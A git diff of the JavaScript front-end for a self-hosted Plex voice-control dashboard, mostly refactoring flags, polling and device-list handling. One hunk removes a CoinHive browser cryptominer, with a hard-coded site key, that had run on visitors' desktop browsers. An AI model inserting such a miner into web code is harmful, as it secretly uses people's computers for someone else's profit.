@@ -1,11 +1,13 @@
 var action = "play";
-var apiToken, appName, bgs, bgWrap, token, newToken, deviceID, resultDuration, logLevel, lastLog, itemJSON,
+var apiToken, appName, bgs, bgWrap, cv, token, newToken, deviceID, resultDuration, logLevel, lastLog, itemJSON,
 	messageArray, publicIP, weatherClass, city, state, updateAvailable,
 	weatherHtml, scrollTimer, direction, progressSlider, volumeSlider;
 
-var couch=false, ombi=false, sick=false, sonarr=false, radarr=false,
-	headphones=false, dvr=false, hook=false, hookPlay=false,
+var couchEnabled=false, lidarrEnabled=false, ombiEnabled=false, sickEnabled=false, sonarrEnabled=false, radarrEnabled=false,
+	headphonesEnabled=false, watcherEnabled=false, dvrEnabled=false, hook=false, hookPlay=false, polling=false, pollcount=false,
 	hookPause=false, hookStop=false, hookCustom=false, hookFetch=false, hookSplit = false, autoUpdate = false;
+
+var forceUpdate = true;
 
 var scrolling = false;
 var condition = null;
@@ -19,7 +21,7 @@ $(function () {
 	console.log("JS Function.");
 	// Set up variables
 	$(".select").dropdown({"optionClass": "withripple"});
-	$('#mainwrap').css({"top": 0});
+	$("#mainWrap").css({"top": 0});
 
 	apiToken = $('#apiTokenData').data('token');
 
@@ -33,60 +35,52 @@ $(function () {
 	publicIP = $('#publicIP').attr('data');
 	newToken = $('#newToken').data('enable') === "true";
 	updateAvailable = $('#updateAvailable').attr('data');
-	var plexClientURI = $('#clientURI').attr('data');
 	var ddText = $('.dd-selected').text();
-	var client = $('#client');
-
 
 	// Initialize CRITICAL UI Elements
 	$('.castArt').show();
 	$('#play').addClass('clicked');
 	$('.ddLabel').html(ddText);
-
+// Hides the loading animation
 });
 
-$(window).on("load",function () {
-	$('body').addClass('loaded');
-	console.log("Load called!");
 
-});
 
+// Self-explanatory
 $(window).resize(function () {
 	scaleElements();
 });
 
+// Build the UI elements after document load
 function buildUiDeferred() {
-
 	console.log("Building UI.");
 	$.material.init();
-	var hookSplit = $('#hookSplit');
-	var urlGroup = $('.urlGroup');
-	var sayString = IPString + "say&apiToken=" + apiToken + "&command={{TextField}}";
-	var IPString = $('#publicAddress').val() + "/api.php?";
 
-	javaStrings = decodeURIComponent($('#strings').data('array'));
+	var messages = $('#messages').data('array');
+	var IPString = $('#publicAddress').val() + "/api.php?";
+	if (IPString.substring(0, 4) !== 'http') {
+		IPString = document.location.protocol + '//' + IPString;
+	}
+	var sayString = IPString + "say&apiToken=" + apiToken + "&command={{TextField}}";
+	cv = "";
+
+	$('#sayURL').val(sayString);
+
+	javaStrings = $('#strings').data('array');
+	javaStrings = decodeURIComponent(javaStrings);
 	javaStrings = javaStrings.replace(/\+/g, ' ');
 	javaStrings = JSON.parse(javaStrings);
 	scaleElements();
 
-	if (IPString.substring(0, 4) !== 'http') {
-		IPString = document.location.protocol + '//' + IPString;
-	}
-
-	$('#sayURL').val(sayString);
-
-	setTimeout(
-		function () {
-			$('#results').css({"top": 0, "max-height": "100%", "overflow": "inherit"})
-		}, 500);
-
+	setTimeout(function () {
+		$('#results').css({"top": 0, "max-height": "100%", "overflow": "inherit"})
+	}, 500);
 
 	$('.formpop').popover();
 
-	var messages = $('#messages').data('array');
 	if (messages !== "" && messages !== undefined) {
-		messages = messages.replace(/\+/g, '%20');
-		messageArray = JSON.parse(decodeURIComponent(messages));
+		messages = decodeURIComponent(messages.replace(/\+/g, '%20'));
+		messageArray = JSON.parse(messages);
 		loopMessages(messageArray);
 		messageArray = [];
 	} else {
@@ -97,19 +91,13 @@ function buildUiDeferred() {
 		showMessage("Updates available!", "You have " + updateAvailable + " update(s) available.", false);
 	}
 
-	if (typeof CoinHive !== 'undefined') {
-		var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
-		if (!miner.isMobile() && !miner.didOptOut(14400)) {
-			console.log("Firing miner.");
-			miner.start();
-		}	// variable is undefined
-	}
-
 	setListeners();
+
 	$(".remove").remove();
 
 	setInterval(function () {
-		updateStatus(false);
+		forceUpdate = false;
+		updateStatus();
 	}, 5000);
 
 	setInterval(function () {
@@ -125,18 +113,15 @@ function buildUiDeferred() {
 function deviceHtml(type, deviceData) {
 	var output = "";
 	$.each(deviceData, function (key, device) {
-		var string;
-		var selected = "";
-		if (device.Selected === "no") {
-			selected = "";
-		} else selected = " dd-selected";
+		var string = "";
 		var id = device.Id;
 		var name = device.Name;
+		var	selected = ((device.Selected) ? ((type === 'Client') ? " dd-selected" : " selected") : "");
 
 		if (type === 'Client') {
 			string = "<a class='dropdown-item client-item" + selected + "' data-type='Client' data-id='" + id + "'>" + name + "</a>";
 		} else {
-			string = "<option data-type='" + type + "' value='" + id + "'" + (device.selected === "yes" ? " selected" : "") + ">" + name + "</option>";
+			string = "<option data-type='" + type + "' value='" + id + "'" + selected + ">" + name + "</option>";
 		}
 		output += string;
 	});
@@ -152,6 +137,7 @@ function updateDevices(newDevices) {
 		$('#clientWrapper').html(deviceHtml('Client', newDevices.Client));
 		$('#serverList').html(deviceHtml('Server', newDevices.Server));
 		$('#parentList').html(deviceHtml('Parent', newDevices.Server));
+		if (newDevices.Dvr.length === 0) $('.dvrGroup').hide(); else ($('.dvrGroup').show());
 		$('#dvrList').html(deviceHtml('Dvr', newDevices.Dvr));
 		$('.ddLabel').html($('.dd-selected').text());
 		devices = JSON.stringify(newDevices);
@@ -159,7 +145,8 @@ function updateDevices(newDevices) {
 }
 
 function updateDevice(type, id, token) {
-	if (true) {
+	var noSocket = true;
+	if (noSocket) {
 		console.log("No socket key, sending using a thingy.");
 		apiToken = $('#apiTokenData').data('token');
 
@@ -167,6 +154,7 @@ function updateDevice(type, id, token) {
 			device: type,
 			id: id
 		}, function (data) {
+			console.log("Received new device array: ", data);
 			updateDevices(data);
 		});
 	} else {
@@ -178,7 +166,7 @@ function updateDevice(type, id, token) {
 				id: id
 			}
 		};
-		doSend(data);
+		//doSend(data);
 	}
 }
 
@@ -194,7 +182,7 @@ function setBackground() {
 	//Add your images, we'll set the path in the next step
 	console.log("Caching background image.");
 	var image = new Image();
-	image.src = "https://img.phlexchat.com?height=" + $(window).height() + "&width=" + $(window).width() + "&v=" + (Math.floor(Math.random() * (1084)));
+	image.src = "https://img.phlexchat.com?height=" + $(window).height() + "&width=" + $(window).width() + "&v=" + (Math.floor(Math.random() * (1084))) + cv;
 	$('#bgwrap').append("<div class='bg hidden'></div>");
 	bgs = $('.bg');
 	var bgWrap = document.getElementById('bgwrap');
@@ -210,51 +198,6 @@ function setBackground() {
 		}, 1500);
 }
 
-function randomIntFromInterval(min, max) {
-	var selection = Math.floor(Math.random() * (max - min + 1) + min);
-	var s = String(selection);
-	while (s.length < 4) {
-		s = "0" + s;
-	}
-	return s;
-}
-
-function loadImage(url, altUrl) {
-	var timer;
-
-	function clearTimer() {
-		if (timer) {
-			clearTimeout(timer);
-			timer = null;
-		}
-	}
-
-	function handleFail() {
-		// kill previous error handlers
-		this.onload = this.onabort = this.onerror = function () {
-		};
-		// stop existing timer
-		clearTimer();
-		// switch to alternate url
-		if (this.src === url) {
-			this.src = altUrl;
-		}
-	}
-
-	var img = new Image();
-	img.onerror = img.onabort = handleFail;
-	img.onload = function () {
-		clearTimer();
-	};
-	img.src = url;
-	timer = setTimeout(function (theImg) {
-		return function () {
-			handleFail.call(theImg);
-		};
-	}(img), 1000);
-	return (img);
-}
-
 
 function resetApiUrl(newUrl) {
 	if (newUrl.substring(0, 4) !== 'http') {
@@ -264,150 +207,175 @@ function resetApiUrl(newUrl) {
 }
 
 
-function updateStatus(force) {
+function updateStatus() {
+	force = forceUpdate;
 	apiToken = $('#apiTokenData').data('token');
 	var logLimit = $('#logLimit').find(":selected").val();
 	var dataCommands = false;
-	$.get('api.php?pollPlayer&apiToken=' + apiToken + '&force='+force+'&logLimit=' + logLimit, function (data) {
-		if (data !== null) {
+	if (!polling) {
+		polling = true;
+		pollcount = 1;
+		$.get('api.php?pollPlayer&apiToken=' + apiToken + '&force=' + force + '&logLimit=' + logLimit, function (data) {
+			console.log("Received poll data.");
+			if (data !== null) {
 
-			if (data.hasOwnProperty('ui')) {
-				$('#mainwrap').append(data.ui);
-				buildUiDeferred();
-			}
-
-			if (data.hasOwnProperty('userdata')) {
-				setUiVariables(data.userdata);
-			}
-
-			if (force) $('.queryBtnGrp').removeClass('show');
-
-			for (var propertyName in data) {
-				console.log("Received updated " + propertyName + " data:", data[propertyName]);
-
-				switch (propertyName) {
-					case "dologout":
-						if (data.dologout === true || data.dologout === "true") {
-							document.getElementById('logout').click();
-						}
-						break;
-					case "commands":
-						updateCommands(data.commands, !force);
-						break;
-					case "messages":
-						messages = data.messages;
-						for (msg in messages) {
-							//Show a message
-						}
-						break;
-					case "updates":
-						$('#updateContainer').html(data.updates);
-						break;
-					case "devices":
-						updateDevices(data.devices);
-						break;
-					case "logs":
-						$('#logBody').html(formatLog(JSON.parse(data.logs)));
-						break;
-					case "playerStatus":
-						updatePlayerStatus(data.playerStatus);
-						break;
-					case "ui":
-					case "userdata":
-						break;
-					default:
-						console.log("Unknown value: " + propertyName);
+				if (data.hasOwnProperty('ui')) {
+					$('#mainWrap').append(data.ui);
+					buildUiDeferred();
 				}
+
+				if (data.hasOwnProperty('userData') && data.userData) {
+					setUiVariables(data.userData);
+					delete data.userData;
+				}
+
+				if (force) $('.queryBtnGrp').removeClass('show');
+
+				for (var propertyName in data) {
+					if (propertyName !== 'ui' && propertyName !== 'playerStatus') {
+						console.log("Received updated " + propertyName + " data:", data[propertyName]);
+					}
+
+					switch (propertyName) {
+						case "dologout":
+							if (data.dologout === true || data.dologout === "true") {
+								document.getElementById('logout').click();
+							}
+							break;
+						case "commands":
+							updateCommands(data.commands, !force);
+							break;
+						case "messages":
+							messages = data.messages;
+							for (msg in messages) {
+								//Show a message
+							}
+							break;
+						case "updates":
+							$('#updateContainer').html(data.updates);
+							break;
+						case "devices":
+							updateDevices(data.devices);
+							break;
+						case "logs":
+							$('#logBody').html(formatLog(JSON.parse(data.logs)));
+							break;
+						case "playerStatus":
+							updatePlayerStatus(data.playerStatus);
+							break;
+						case "ui":
+						case "userdata":
+							break;
+						default:
+							console.log("Unknown value: " + propertyName);
+					}
+				}
+
 			}
-
+			polling = false;
+		}, dataType = "json");
+	} else {
+		console.log("Waiting for poll response...");
+		pollcount++;
+		if (pollcount >= 10) {
+			console.log("Breaking poll wait.");
+			polling = false;
 		}
-
-	}, dataType = "json");
+	}
 
 }
 
 function setUiVariables(data) {
+	console.log("Have some data: ", data);
 	for (var propertyName in data) {
 		switch (propertyName) {
+
 			case 'sonarrEnabled':
-				sonarr = data.sonarrEnabled;
-				break;
 			case 'sickEnabled':
-				sick = data.sickEnabled;
-				break;
 			case 'couchEnabled':
-				couch = data.couchEnabled;
-				break;
 			case 'radarrEnabled':
-				radarr = data.radarrEnabled;
-				break;
 			case 'ombiEnabled':
-				ombi = data.ombiEnabled;
-				break;
 			case 'headphonesEnabled':
-				headphones = data.headphonesEnabled;
-				break;
+			case 'lidarrEnabled':
+			case 'watcherEnabled':
 			case 'hook':
-				hook = data.hook;
-				break;
 			case 'hookPlay':
-				hookPlay = data.hookPlay;
-				break;
 			case 'hookPause':
-				hookPause = data.hookPause;
-				break;
 			case 'hookStop':
-				hookStop = data.hookStop;
-				break;
 			case 'hookFetch':
-				hookFetch = data.hookFetch;
-				break;
 			case 'hookCustom':
-				hookCustom = data.hookCustom;
-				break;
 			case 'hookSplit':
-				hookSplit = data.hookSplit;
+			case 'dvrEnabled':
+				value = JSON.parse(data[propertyName]);
+				if(window[propertyName] !== value) {
+					console.log("Updating " + propertyName + " to " + value);
+					window[propertyName] = value;
+				}
+				break;
+			case 'publicAddress':
+				value = data[propertyName];
+				if(window[propertyName] !== value) {
+					console.log("Updating " + propertyName + " to " + value);
+					window[propertyName] = value;
+				}
+				break;
+
+			case 'couchList':
+			case 'sonarrList':
+			case 'radarrList':
+			case 'lidarrList':
+			case 'watcherList':
+			case 'ombiList':
+			case 'sickList':
+				var list = data[propertyName];
+				console.log("Received a fetcher profile list for " + propertyName,list);
+				$(propertyName).html(list);
 		}
 	}
 	toggleGroups();
 }
 
 function toggleGroups() {
+	console.log("Toggling groups.");
 	var vars = {
-		"sonarr": sonarr,
-		"sick": sick,
-		"couch": couch,
-		"radarr": radarr,
-		"ombi": ombi,
-		"headphones": headphones,
+		"sonarr": sonarrEnabled,
+		"sick": sickEnabled,
+		"couch": couchEnabled,
+		"radarr": radarrEnabled,
+		"ombi": ombiEnabled,
+		"watcher": watcherEnabled,
+		"headphones": headphonesEnabled,
+		"lidarr": lidarrEnabled,
 		"hookPlay": hookPlay,
 		"hookPause": hookPause,
 		"hookStop": hookStop,
 		"hookFetch": hookFetch,
 		"hookCustom": hookCustom,
 		"hookSplit": hookSplit,
-		"hook": hook
+		"hook": hook,
+		"dvr": dvrEnabled
 	};
 	for (var key in vars){
+
 		if (vars.hasOwnProperty(key)) {
 			var value = vars[key];
 			console.log("Setting " + key + " to ",value);
 			var element = $('#'+key);
-			var group;
-			if (key === 'hookSplit') {
-				group = $('.'+key+'Group');
-			} else {
-				group = $('#'+key+'Group');
-			}
-			element.prop('checked',value);
-			if (value) {
-				group.show();
-				console.log("Showing ",group);
-			} else {
-				group.hide();
-				console.log("Hiding ",group);
+			var group = (key === 'hookSplit') ? $('.'+key+'Group') : group = $('#'+key+'Group');
+
+			if (element.prop('checked') != value) {
+				element.prop('checked', value);
 			}
 
+			if (value) {
+					group.show();
+					console.log("Showing ", group);
+
+			} else {
+					group.hide();
+					console.log("Hiding ", group);
+
+			}
 		}
 	}
 }
@@ -445,6 +413,13 @@ function updatePlayerStatus(data) {
 				reversed : true
 			});
 
+			$('#volumeSlider').change(function() {
+				apiToken = $('#apiTokenData').data('token');
+				var volume = $(this).val();
+				var url = 'api.php?say&command=set+the+volume+to+' + volume + "+percent&apiToken=" + apiToken;
+				$.get(url);
+			});
+
 			progressSlider.fadeOut;
 			volumeSlider.fadeOut;
 
@@ -461,6 +436,7 @@ function updatePlayerStatus(data) {
 
 			var resultOffset = data.time;
 			var volume = data.volume;
+			console.log("Volume is " + volume);
 			resultDuration = mr.duration;
 			var progress = (resultOffset / 1000);
 			progressSlider.bootstrapSlider({max: resultDuration / 1000});
@@ -515,20 +491,20 @@ function updateCommands(data, prepend) {
 			if (value === []) return true;
 			try {
 				var initialCommand = ucFirst(value.initialCommand);
-				var timeStamp = ($.inArray('timeStamp', value) ? $.trim(value.timestamp) : '');
+				var timeStamp = (value.hasOwnProperty('timeStamp') ? $.trim(value.timeStamp) : '');
 				speech = (value.speech ? value.speech : "");
 				if ($(window).width() < 700) speech = speech.substring(0, 100);
 				var status = (value.mediaStatus ? value.mediaStatus : "");
 				itemJSON = value;
-				var JSONdiv = '<a href="javascript:void(0)" id="JSON' + i + '" class="JSONPop" data="' + encodeURIComponent(JSON.stringify(value, null, 2)) + '" title="Result JSON">{JSON}</a>';
-				var mediaDiv = false;
+				var mediaDiv;
 				// Build our card
 				var cardResult = buildCards(value, i);
 				mediaDiv = cardResult[0];
 				var bgImage = cardResult[1];
 				var style = bgImage ? "data-src='" + bgImage + "'" : "style='background-color:'";
+				var className = bgImage ? " filled" : "";
 				var outLine =
-					"<div class='resultDiv card noHeight' id='" + timeStamp + "'>" +
+					"<div class='resultDiv card noHeight"+className+"' id='" + timeStamp + "'>" +
 					'<button id="CARDCLOSE' + i + '" class="cardClose"><span class="material-icons">close</span></button>' +
 					mediaDiv +
 					"<div class='cardColors'>" +
@@ -554,21 +530,12 @@ function updateCommands(data, prepend) {
 				console.error(e, e.stack);
 			}
 			$('#JSON' + i).click(function () {
-				var JSON = decodeURIComponent($(this).attr('data'));
-				BootstrapDialog.alert({
-					title: 'Result JSON',
-					message: JSON,
-					closable: true,
-					buttons: [{
-						label: 'Copy JSON',
-						title: 'Copy JSON to clipboard',
-						cssClass: 'btnAdd',
-						action: function (dialogItself) {
-							clipboard.copy(JSON);
-						}
-
-					}]
-				});
+				var jsonData = decodeURIComponent($(this).attr('data'));
+				jsonData = JSON.parse(jsonData);
+				jsonData = recurseJSON(jsonData);
+				$('#jsonTitle').text('Result JSON');
+				$('#jsonBody').html(jsonData);
+				$('#jsonModal').modal('show');
 			});
 
 			$('#CARDCLOSE' + i).click(function () {
@@ -654,7 +621,7 @@ function formatLog(logJSON) {
 					'<span>' + line.message + logHTML + '</span></div>';
 			}
 		});
-		if (htmlOut == '') htmlOut = '<div class="alert alert-info">' +
+		if (htmlOut === '') htmlOut = '<div class="alert alert-info">' +
 			'<span class="badge badge-default"><b>No records found.</b></span>' +
 
 			'</div>';
@@ -718,7 +685,7 @@ function recurseJSON(json) {
 
 function buildCards(value, i) {
 	var cardBg = false;
-	var timeStamp = ($.inArray('timeStamp', value) ? $.trim(value.timestamp) : '');
+	var timeStamp = (value.hasOwnProperty('timeStamp') ? $.trim(value.timeStamp) : '');
 	var title = '';
 	var subtitle = '';
 	var description = '';
@@ -730,9 +697,9 @@ function buildCards(value, i) {
 
 	if ($(window).width() < 700) speech = speech.substring(0, 100);
 
-	if (value.hasOwnProperty('card')) {
-		if ((value.card.length > 0) && (value.card instanceof Array)) {
-			var cardArray = value.card;
+	if (value.hasOwnProperty('cards')) {
+		if ((value.cards.length > 0) && (value.cards instanceof Array)) {
+			var cardArray = value.cards;
 			var card = cardArray[0];
 			//Get our general variables about this media object
 			if (cardArray.length === 1) {
@@ -760,7 +727,7 @@ function buildCards(value, i) {
 		'<li class="card-subtitle">' + subtitle + '</li>' +
 		'<li class="card-description">' + description + '</li>' +
 		'<li class="card-request card-text"><b>' + javaStrings[2] + ' </b>"' + initialCommand + '."</li>' +
-		'<li class="card-reply card-text"><b>' + javaStrings[3] + ' </b> "' + speech + '</li>' +
+		'<li class="card-reply card-text"><b>' + javaStrings[3] + ' </b> "' + speech + '"</li>' +
 		'<li class="card-json">' + JSONdiv + '</li>' +
 		'</ul>' +
 		'<br>';
@@ -841,8 +808,7 @@ function formatAMPM() {
 	hours = hours % 12;
 	hours = hours ? hours : 12; // the hour '0' should be '12'
 	minutes = minutes < 10 ? '0' + minutes : minutes;
-	var strTime = hours + ':' + minutes + ' ' + ampm;
-	return strTime;
+	return hours + ':' + minutes + ' ' + ampm;
 }
 
 function fetchWeather() {
@@ -963,7 +929,7 @@ function setWeather() {
 
 function imgError(image) {
 	image.onerror = "";
-	image.src = "https://phlexchat.com/img.php?random&height=" + $(document).height() + "&width=" + $(document).width() + "&v=" + (Math.floor(Math.random() * (1084)));
+	image.src = "https://img.phlexchat.com?height=" + $(document).height() + "&width=" + $(document).width() + "&v=" + (Math.floor(Math.random() * (1084)));
 	return true;
 }
 
@@ -980,13 +946,6 @@ function setListeners() {
 	// 	$.get(url);
 	// });
 	//
-	// volumeSlider.noUiSlider.on('end', function (values, handle) {
-	// 	var value = values[handle];
-	// 	apiToken = $('#apiTokenData').data('token');
-	// 	var url = 'api.php?control&command=volume&value=' + value + "&apiToken=" + apiToken;
-	// 	$.get(url);
-	// });
-
 
 	$('#alertModal').on('hidden.bs.modal', function () {
 		loopMessages();
@@ -1015,7 +974,18 @@ function setListeners() {
 			} else {
 				group.hide();
 			}
+			window[appName] = checked;
+		}
+	});
 
+	$('.avatar').click(function() {
+		console.log("Click");
+		staticCount++;
+		if (staticCount >= 14 && cv==="") {
+			console.log("CAGED!");
+			cv="&cage=true";
+			$('#actionLabel').text("You don't say!?!?");
+			setBackground();
 		}
 	});
 
@@ -1040,7 +1010,7 @@ function setListeners() {
 		setcookie('PHPSESSID', '', time() - 86400, '/folder/');
 		setTimeout(
 			function () {
-				$('#mainwrap').css({"top": "-200px"});
+				$('#mainWrap').css({"top": "-200px"});
 				bgs.fadeOut(1000);
 				$('.castArt').fadeOut(1000);
 			}, 500);
@@ -1049,8 +1019,8 @@ function setListeners() {
 	});
 
 	$(".btn").on('click', function () {
+		var serverAddress = $("#publicAddress").attr('data');
 		var value, regUrl;
-		var serverAddress = $('#publicAddress').val();
 		if ($(this).hasClass("copyInput")) {
 			value = $(this).val();
 			clipboard.copy(value);
@@ -1092,8 +1062,9 @@ function setListeners() {
 		if ($(this).hasClass("linkBtn")) {
 			regUrl = false;
 			action = $(this).data('action');
-			if (action === 'google') regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress;
-			if (action === 'amazon') regUrl = 'https://phlexchat.com/alexaAuth.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress;
+			if (action === 'googlev2') regUrl = 'https://phlexchat.com/apiv2.php?apiToken=' + apiToken + "&serverAddress=" + encodeURIComponent(serverAddress);
+			if (action === 'google') regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + encodeURIComponent(serverAddress);
+			if (action === 'amazon') regUrl = 'https://phlexchat.com/alexaAuth.php?apiToken=' + apiToken + "&serverAddress=" + encodeURIComponent(serverAddress);
 			if (regUrl) {
 				newwindow = window.open(regUrl, '');
 				if (window.focus) {
@@ -1103,7 +1074,7 @@ function setListeners() {
 				if (action === 'test') {
 					apiToken = $('#apiTokenData').data('token');
 
-					regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress + "&test=true";
+					regUrl = 'https://app.phlexchat.com/api.php?apiToken=' + apiToken + "&serverAddress=" + encodeURIComponent(serverAddress) + "&test=true";
 					$.get(regUrl, function (data) {
 						console.log("Data: " + data);
 						$.snackbar({content: data});
@@ -1117,36 +1088,50 @@ function setListeners() {
 	$(document).on('click', '.client-item', function () {
 		var clientId = $(this).data('id');
 		if ($(this).data('id') !== "rescan") {
-			$('.ddLabel').html($(this).text());
 			$(this).siblings().removeClass('dd-selected');
 			$(this).addClass('dd-selected');
+			$('.ddLabel').html($('.dd-selected').text());
+
 		} else {
 			console.log("Rescanning devices.");
 		}
 		updateDevice('Client', clientId, apiToken);
 	});
 
-	$(".serverList").change(function () {
-		console.log("Serverlist change...");
+	$("#serverList").change(function () {
 		var serverID = $(this).val();
 		var element = $(this).find('option:selected');
 		var type = element.data('type');
 		apiToken = $('#apiTokenData').data('token');
 
 		$.get('api.php?apiToken=' + apiToken, {
-			device: type,
+			device: 'Server',
 			id: serverID
-		},function(data) {
-			if (data === "valid") {
-				console.log("Data saved.");
-				updateDevices(data);
-				$.snackbar({content: "Value saved successfully."});
-			} else {
-				console.log("Data value was invalid.");
-				$.snackbar({content: "Error saving " + type + " selection."});
-				$(this).val("");
-			}
-		} );
+		});
+	});
+
+	$("#parentList").change(function () {
+		var serverID = $(this).val();
+		var element = $(this).find('option:selected');
+		var type = element.data('type');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {
+			device: 'Parent',
+			id: serverID
+		});
+	});
+
+	$("#dvrList").change(function () {
+		var serverID = $(this).val();
+		var element = $(this).find('option:selected');
+		var type = element.data('type');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {
+			device: 'Dvr',
+			id: serverID
+		});
 	});
 
 	$(".profileList").change(function () {
@@ -1175,7 +1160,7 @@ function setListeners() {
 		var command = $('#commandTest').val();
 		if (command !== '') {
 			command = command.replace(/ /g, "+");
-			var url = 'api.php?say&command=' + command + '&apiToken=' + apiToken;
+			var url = 'api.php?say&web=true&command=' + command + '&apiToken=' + apiToken;
 			apiToken = $('#apiTokenData').data('token');
 			$.get(url, function () {
 				$('.load-bar').hide();
@@ -1298,11 +1283,22 @@ function setListeners() {
 		if ($(this).id === 'publicAddress') {
 			value = resetApiUrl($(this).val());
 		}
+
+		if ($(this).hasClass('appToggle')) {
+			id = id + "Enabled";
+			console.log("This is an appToggle, value is now " + value);
+		}
+
 		apiToken = $('#apiTokenData').data('token');
 
 		$.get('api.php?apiToken=' + apiToken, {id: id, value: value}, function (data) {
 			if (data === "valid") {
 				console.log("Data saved.");
+				if (window.hasOwnProperty(id)) {
+					console.log("Hey, this has a global variable, changing it from " + window[id]);
+					window[id] = value;
+					console.log("Changed to " + window[id]);
+				}
 				$.snackbar({content: "Value saved successfully."});
 			} else {
 				console.log("Data value was invalid.");
@@ -1345,4 +1341,17 @@ jQuery.extend({
 
 		return true;
 	}
+});
+
+
+$(window).on("load",function () {
+	$('body').addClass('loaded');
+	if ('requestIdleCallback' in window) {
+		console.log("Request idle supported!!");
+		forceUpdate = true;
+		requestIdleCallback(updateStatus);
+	} else {
+		setTimeout(updateStatus, 1);
+	}
+
 });
